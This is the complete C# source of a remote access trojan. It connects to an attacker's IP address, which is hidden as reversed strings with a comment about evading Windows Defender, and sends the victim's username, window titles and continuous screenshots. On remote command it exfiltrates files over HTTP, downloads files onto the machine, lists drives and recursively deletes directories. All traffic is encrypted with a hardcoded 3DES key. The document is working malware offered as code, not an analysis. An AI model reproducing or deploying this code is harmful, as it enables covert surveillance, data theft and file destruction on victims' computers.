using System;
using System.Diagnostics;
using System.Text;
using SimpleTCP;

namespace contingency
{
    class Program
	{
		static SimpleTcpClient client;
		public static string publicip;

		static string h4v0c(string param)
		{
			string x = param, y;
			char[] charArray = x.ToCharArray();
			Array.Reverse(charArray);
			y = new string(charArray);
			return y;
		}

		[System.Runtime.InteropServices.DllImport("user32.dll")]
		static extern IntPtr GetForegroundWindow();

		[System.Runtime.InteropServices.DllImport("user32.dll")]
		static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

		private static string t1ts()
		{
			const int nChars = 256;
			StringBuilder Buff = new StringBuilder(nChars);
			IntPtr handle = GetForegroundWindow();

			if (GetWindowText(handle, Buff, nChars) > 0)
			{
				return Buff.ToString();
			}
			return null;
		}

		static void b0w(object sender, EventArgs e)
		{
			client.Disconnect();
		}

		static void h0n3st(string data)
		{
			try
			{
				client.WriteLine(data);
			}
			catch (Exception e)
			{
				//Console.WriteLine(e.Message);
				hlo = false;
			}
		}

		static bool hlo = false;
		static void b00m()
		{
			if (hlo) return;
			{
				try
				{
					//string result = new System.Net.WebClient().DownloadString("https://19216801.usite.pro/xx.txt");
					//string[] splitt = result.Split(':');

					//client.Connect((true == false ? h4v0c("1*0*0*721").Replace('*', '.') : h4v0c("68*891*21*5").Replace('*', '.')), 6666); // obfuscare Windows Defender
					client.Connect(h4v0c("121*97*72*881").Replace('*', '.'), 6666);
					hlo = true;
					Console.WriteLine("[DEBUG] Successfully connected to host.");

					Microsoft.VisualBasic.Devices.ComputerInfo CI = new Microsoft.VisualBasic.Devices.ComputerInfo();
					string ram = ((double)(ulong.Parse(CI.TotalPhysicalMemory.ToString()) / (1024 * 1024) / 1000)).ToString();

					PerformanceCounter up = new PerformanceCounter("System", "System Up Time");
					up.NextValue();
					TimeSpan uptime = TimeSpan.FromSeconds(up.NextValue());

					h0n3st(encryptus("[*]" + Environment.UserName + "[*]" + ram + "[*]" +
						t1ts() + "[*]" + (ulong)uptime.TotalSeconds, h4v0c("SX24MNICVM4D")));

				}
				catch (Exception ee)
				{
					Console.WriteLine("[DEBUG] Failed connecting to host! Attempting to reconnect...");
					hlo = false;
				}
			}
		}

		static void Main(string[] args)
		{
			Console.Title = string.Empty;
			AppDomain.CurrentDomain.ProcessExit += new EventHandler(b0w);
			client = new SimpleTcpClient();
			client.DelimiterDataReceived += Client_DelimiterDataReceived;
			publicip = new System.Net.WebClient().DownloadString("https://api.ipify.org");
			while (true)
			{
				System.Threading.Thread.Sleep(1500);
				b00m();
				if (hlo)
				{
					System.Drawing.Bitmap bitmap = new System.Drawing.Bitmap(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width,
						System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height);
					System.Drawing.Graphics graphics = System.Drawing.Graphics.FromImage(bitmap as System.Drawing.Image);
					graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
					System.IO.MemoryStream ms = new System.IO.MemoryStream();
					bitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
					byte[] byteImage = ms.ToArray();
					var SigBase64 = Convert.ToBase64String(byteImage);

					h0n3st(encryptus("[**]" + t1ts() + "[**]" + SigBase64, h4v0c("SX24MNICVM4D")));
				}
			}
		}

		private static async void Client_DelimiterDataReceived(object sender, Message e)
		{
			try
			{
				string flp = dencryptus(e.MessageString, h4v0c("SX24MNICVM4D"));
				if (flp.Equals("[X]"))
				{
					hlo = false;
					client.Disconnect();
				}
				else if (flp.StartsWith("[X]"))
				{
					string[] split = flp.Split(new[] { "[X]" }, StringSplitOptions.None);
					if (split[1].Equals(publicip + ":" + client.TcpClient.Client.LocalEndPoint.ToString().Split(':')[1]))
					{
						hlo = false;
						client.Disconnect();
					}
				}
				else if (flp.StartsWith("[*]"))
				{
					string[] split = flp.Split(new[] { "[*]" }, StringSplitOptions.None);
					if (split[1].Equals(publicip + ":" + client.TcpClient.Client.LocalEndPoint.ToString().Split(':')[1]))
					{
						
						string files = "[***]";
						foreach (string dir in System.IO.Directory.GetDirectories(split[2]))
						{
							files += dir.Replace(split[2], string.Empty) + h4v0c("]***[!redlof.");
						}
						foreach (string file in System.IO.Directory.GetFiles(split[2]))
						{
							System.IO.FileInfo fil = new System.IO.FileInfo(file);
							files += file.Replace(split[2], string.Empty + "[***]");
						}
						h0n3st(encryptus(files, h4v0c("SX24MNICVM4D")));
					}
				}
				else if (flp.StartsWith("[**]"))
				{
					string[] split = flp.Split(new[] { "[**]" }, StringSplitOptions.None);
					if (split[1].Equals(publicip + ":" + client.TcpClient.Client.LocalEndPoint.ToString().Split(':')[1]))
					{
						if (System.IO.Directory.Exists(split[2]))
						{
							sw33p(split[2]);
							h0n3st(encryptus("[!]The directory was successfully deleted.", h4v0c("SX24MNICVM4D")));
						}
						else if (System.IO.File.Exists(split[2]))
						{
							System.IO.File.Delete(split[2]);
							h0n3st(encryptus("[!]The file was successfully deleted.", h4v0c("SX24MNICVM4D")));
						}
						else
                        {
							h0n3st(encryptus("[?]The directory/file was not found.", h4v0c("SX24MNICVM4D")));
						}
					}
				}
				else if (flp.StartsWith("[***]"))
				{
					string[] split = flp.Split(new[] { "[***]" }, StringSplitOptions.None);
					if (split[1].Equals(publicip + ":" + client.TcpClient.Client.LocalEndPoint.ToString().Split(':')[1]))
					{
						if (System.IO.File.Exists(split[2]))
						{
							// curl -v -XPOST -F "file=@C:/Users/matei/Downloads/DXSDK_Jun10.exe" -F "filename=DXSDK_Jun10.exe" -F "path=/ftp/" http://127.0.0.1:9090/upload
							using (var httpClient = new System.Net.Http.HttpClient())
							{
								var multipartContent = new System.Net.Http.MultipartFormDataContent();
								multipartContent.Add(new System.Net.Http.ByteArrayContent(System.IO.File.ReadAllBytes(split[2])), h4v0c("elif"), System.IO.Path.GetFileName(split[2]));
								multipartContent.Add(new System.Net.Http.StringContent(System.IO.Path.GetFileName(split[2])), h4v0c("emanelif"));
								multipartContent.Add(new System.Net.Http.StringContent(h4v0c("/ptf/")), h4v0c("htap"));
								var response = await httpClient.PostAsync(
									(true == false ? h4v0c("1*0*0*721").Replace('*', '.') : h4v0c("daolpu/0909:121*97*72*881//:ptth").Replace('*', '.')), multipartContent);
								h0n3st(encryptus("[!]The file was successfully downloaded.", h4v0c("SX24MNICVM4D")));
							}
						}
					}
				}
				else if (flp.StartsWith("[****]"))
				{
					string[] split = flp.Split(new[] { "[****]" }, StringSplitOptions.None);
					if (split[1].Equals(publicip + ":" + client.TcpClient.Client.LocalEndPoint.ToString().Split(':')[1]))
					{
						System.Windows.Forms.MessageBox.Show(split[3], split[2], System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error);
					}
				}
				else if (flp.StartsWith("[*****]"))
				{
					string[] split = flp.Split(new[] { "[*****]" }, StringSplitOptions.None);
					if (split[1].Equals(publicip + ":" + client.TcpClient.Client.LocalEndPoint.ToString().Split(':')[1]))
					{
						if (split[3].EndsWith("\\")) split[3] = split[3].Remove(split[3].Length - 1);
						if (!split[3].EndsWith(split[2])) split[3] += "\\" + split[2];
						using (System.Net.WebClient wc = new System.Net.WebClient())
						{
							wc.DownloadFile(new System.Uri(h4v0c(string.Format("{0}/0909:121*97*72*881//:ptth", h4v0c(split[2]))).Replace('*', '.')), split[3]);
							wc.Dispose();
							h0n3st(encryptus("[!]The file was successfully uploaded.", h4v0c("SX24MNICVM4D")));
						}
					}
				}
				else if (flp.StartsWith("[******]"))
                {
					string[] split = flp.Split(new[] { "[******]" }, StringSplitOptions.None);
					if (split[1].Equals(publicip + ":" + client.TcpClient.Client.LocalEndPoint.ToString().Split(':')[1]))
                    {
                        System.IO.DriveInfo[] allDrives = System.IO.DriveInfo.GetDrives();
						string fin = string.Empty;
						foreach(System.IO.DriveInfo dr in allDrives)
                        {
							fin += "[*****]";
							fin += dr.Name + " ";
							fin += "[" + dr.DriveType + "]";
                        }
						h0n3st(encryptus(fin, h4v0c("SX24MNICVM4D")));
					}
				}
			}
			catch(Exception ee)
			{
				Console.WriteLine(ee.Message);
				h0n3st(encryptus("[?]" + ee.Message, h4v0c("SX24MNICVM4D")));
			}
		}

		public static void sw33p(string durr)
		{
			string[] files = System.IO.Directory.GetFiles(durr);
			string[] dirs = System.IO.Directory.GetDirectories(durr);

			foreach (string file in files)
			{
				System.IO.File.SetAttributes(file, System.IO.FileAttributes.Normal);
				System.IO.File.Delete(file);
			}

			foreach (string dir in dirs)
			{
				sw33p(dir);
			}

			System.IO.Directory.Delete(durr, false);
		}

		public static string encryptus(string x, string encrypt)//function
		{
			try
			{
				string y = x;
				byte[] etext = UTF8Encoding.UTF8.GetBytes(y);
				string Code = encrypt;
				System.Security.Cryptography.MD5CryptoServiceProvider mdhash = new System.Security.Cryptography.MD5CryptoServiceProvider();
				byte[] keyarray = mdhash.ComputeHash(UTF8Encoding.UTF8.GetBytes(Code));
				System.Security.Cryptography.TripleDESCryptoServiceProvider tds = new System.Security.Cryptography.TripleDESCryptoServiceProvider();
				tds.Key = keyarray;
				tds.Mode = System.Security.Cryptography.CipherMode.ECB;
				tds.Padding = System.Security.Cryptography.PaddingMode.PKCS7;

				System.Security.Cryptography.ICryptoTransform itransform = tds.CreateEncryptor();
				byte[] result = itransform.TransformFinalBlock(etext, 0, etext.Length);
				string encryptresult = Convert.ToBase64String(result);
				return encryptresult.ToString();
			}
			catch (Exception ex)
			{
				return ex.Message;
			}
		}

		public static string dencryptus(string x, string keyai)
		{
			try
			{
				string y = x.Replace("\0", null);
				byte[] etext = Convert.FromBase64String(y);
				string key = keyai;
				System.Security.Cryptography.MD5CryptoServiceProvider mdhash = new System.Security.Cryptography.MD5CryptoServiceProvider();
				byte[] keyarray = mdhash.ComputeHash(UTF8Encoding.UTF8.GetBytes(key));
				System.Security.Cryptography.TripleDESCryptoServiceProvider tds = new System.Security.Cryptography.TripleDESCryptoServiceProvider();
				tds.Key = keyarray;
				tds.Mode = System.Security.Cryptography.CipherMode.ECB;
				tds.Padding = System.Security.Cryptography.PaddingMode.PKCS7;

				System.Security.Cryptography.ICryptoTransform itransform = tds.CreateDecryptor();
				byte[] result = itransform.TransformFinalBlock(etext, 0, etext.Length);
				string dencryptresult = UTF8Encoding.UTF8.GetString(result);
				return dencryptresult.ToString();
			}
			catch (Exception ex)
			{
				return ex.Message;
			}
		}
	}
}
